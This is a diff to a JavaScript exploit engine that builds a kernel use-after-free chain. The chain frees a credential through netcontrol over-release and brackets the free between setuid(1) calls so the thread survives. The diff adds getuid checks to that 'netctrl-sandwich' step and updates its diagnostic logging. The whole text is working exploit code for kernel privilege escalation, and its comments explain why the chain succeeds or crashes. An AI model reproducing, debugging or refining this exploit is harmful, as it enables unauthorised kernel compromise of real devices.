@@ -4162,29 +4162,42 @@ export function makePoopsEngine(X) {
        CLEAR matched no slot and returned -1, and a netcontrol slot -- one of
        the two this boot has -- was spent for nothing.
        One chain closes the window to the length of four syscalls. */
+    /* getuid on both ends of the sandwich.
+       -----------------------------------------------------------------------
+       The whole point of the two setuid(1) calls is that each one hands the
+       thread a NEW ucred, so the credential the over-release frees is one the
+       thread is no longer running on. If this process is ALREADY uid 1, setuid
+       is a no-op, no new cred is allocated, and CLEAR frees the credential
+       under the running thread -- which is exactly what "CLEAR returns 0 and
+       the process dies immediately" looks like, every time, across three
+       different builds of the instrumentation.
+       Both reads are inside the pre-free window, where syscalls are free. */
     await runBuilt("netctrl-sandwich", () => {
-      armRet(4);
-      emit(PSYS.CLOSE, retPtr(0), discard);
-      emit(PSYS.SETUID, retPtr(1), 1);
-      emit(PSYS.SOCKET, retPtr(2), K.AF_UNIX, K.SOCK_STREAM, 0);
-      emit(PSYS.SETUID, retPtr(3), 1);
+      armRet(6);
+      emit(PSYS.GETUID, retPtr(0));
+      emit(PSYS.CLOSE, retPtr(1), discard);
+      emit(PSYS.SETUID, retPtr(2), 1);
+      emit(PSYS.SOCKET, retPtr(3), K.AF_UNIX, K.SOCK_STREAM, 0);
+      emit(PSYS.SETUID, retPtr(4), 1);
+      emit(PSYS.GETUID, retPtr(5));
     });
     untrack(discard);
     S.setuidCalls += 2;
     await ttyMark(
       "NETCTRL-SANDWICH",
-      "close=" + retOf(0) + "-setuid=" + retOf(1) + "-socket=" + retOf(2)
-        + "-setuid2=" + retOf(3) + "-wanted=" + discard,
+      "uidBefore=" + retOf(0) + "-close=" + retOf(1) + "-setuid=" + retOf(2)
+        + "-socket=" + retOf(3) + "-setuid2=" + retOf(4)
+        + "-uidAfter=" + retOf(5) + "-wanted=" + discard,
     );
-    let uafFd = retOf(2);
+    let uafFd = retOf(3);
     if (uafFd < 0)
       throw new Error(
         "uaf socket failed inside the sandwich chain: ret=" +
           uafFd +
           " (close=" +
-          retOf(0) +
-          ", setuid=" +
           retOf(1) +
+          ", setuid=" +
+          retOf(2) +
           ")",
       );
 
@@ -4230,7 +4243,7 @@ export function makePoopsEngine(X) {
     );
 
     w32(b.clrBuf.u8, 0, S.uafSock);
-    flushMark(
+    await ttyMark(
       "NETCTRL-CLEAR-PRE",
       "slot=" +
         slot +
